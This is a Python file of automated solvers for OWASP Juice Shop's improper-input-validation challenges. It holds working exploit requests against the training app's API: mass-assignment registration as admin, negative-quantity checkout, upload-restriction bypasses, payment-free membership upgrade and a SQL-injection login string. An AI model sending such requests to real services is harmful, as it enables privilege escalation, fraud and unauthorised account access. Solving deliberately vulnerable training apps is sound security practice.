#!/usr/bin/env python3
"""Improper Input Validation challenges."""
from __future__ import annotations

from core import register_solver, Client, ok, warn, fail

CAT = "Improper Input Validation"
DOMAIN = "juice-sh.op"


@register_solver("emptyUserRegistrationChallenge", "Register user with empty fields", CAT)
def empty_user(c: Client):
    # bypass client-side validation: send empty email + password directly to the API
    r = c.s.post(c.url("/api/Users"),
                 json={"email": "", "password": "", "passwordRepeat": "",
                       "securityQuestion": None, "securityAnswer": ""},
                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
    ok(f"registered empty user ({r.status_code})")


@register_solver("registerAdminChallenge", "Register as admin (mass-assignment)", CAT)
def register_admin(c: Client):
    r = c.s.post(c.url("/api/Users"),
                 json={"email": "admin_solver@test.local", "password": "Password1!",
                       "passwordRepeat": "Password1!", "role": "admin",
                       "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
    role = (r.json().get("data") or {}).get("role") if r.ok else None
    ok(f"registered user with role={role} ({r.status_code})")


@register_solver("negativeOrderChallenge", "Place order with negative total", CAT)
def negative_order(c: Client):
    c.ensure_user("neg_solver@test.local", "Password1!")
    add = c.post("/api/BasketItems/", json={"BasketId": c.bid, "ProductId": 1, "quantity": 1})
    if add.ok:
        item_id = add.json()["data"]["id"]
        c.put(f"/api/BasketItems/{item_id}", json={"quantity": -100})
    co = c.post(f"/rest/basket/{c.bid}/checkout", json={})
    ok(f"checked out basket with negative quantity ({co.status_code})")


@register_solver("uploadSizeChallenge", "Upload file > 100 KB", CAT)
def upload_size(c: Client):
    c.ensure_user("upload_solver@test.local", "Password1!")
    big = b"1234567890" * 11000            # ~107 KB
    r = c.post("/file-upload", files={"file": ("invalidSizeForClient.pdf", big, "application/pdf")})
    ok(f"uploaded oversized pdf ({r.status_code})")


@register_solver("uploadTypeChallenge", "Upload non-PDF/ZIP file", CAT)
def upload_type(c: Client):
    c.ensure_user("upload_solver@test.local", "Password1!")
    r = c.post("/file-upload", files={"file": ("invalidTypeForClient.exe", b"test", "application/x-msdownload")})
    ok(f"uploaded .exe ({r.status_code})")


@register_solver("freeDeluxeChallenge", "Free deluxe membership", CAT)
def free_deluxe(c: Client):
    if not c.login(f"jim@{DOMAIN}'--", "a"):
        c.ensure_user("deluxe_solver@test.local", "Password1!")
    # POST with no paymentMode -> upgrades without payment
    r = c.post("/rest/deluxe-membership", json={})
    status = r.json().get("status") if r.headers.get("content-type", "").startswith("application/json") else r.status_code
    ok(f"deluxe upgrade result: {status}")


@register_solver("zeroStarsChallenge", "Post zero-star feedback", CAT)
def zero_stars(c: Client):
    r = c.add_feedback("Comment", rating=0)
    ok(f"posted 0-star feedback ({r.status_code})")


# ---- best-effort / harder ------------------------------------------------- #
@register_solver("nftMintChallenge", "Mint NFT (best-effort)", CAT)
def nft_mint(c: Client):
    warn("nftMint requires signing a web3 transaction - browser/wallet step, not automated here")


@register_solver("manipulateClockChallenge", "Manipulate clock (best-effort)", CAT)
def manipulate_clock(c: Client):
    warn("manipulateClock requires the web3/NFT time trick - browser step, not automated here")
